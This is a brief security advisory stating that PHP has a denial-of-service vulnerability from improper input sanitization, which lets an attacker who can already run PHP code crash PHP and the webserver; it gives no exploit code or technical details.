PHP is prone to a denial-of-service vulnerability because it fails to properly sanitize user-supplied input.

An attacker who can run PHP code on a vulnerable computer may exploit this vulnerability to crash PHP and the webserver, denying service to legitimate users.

This issue affects all versions of PHP.
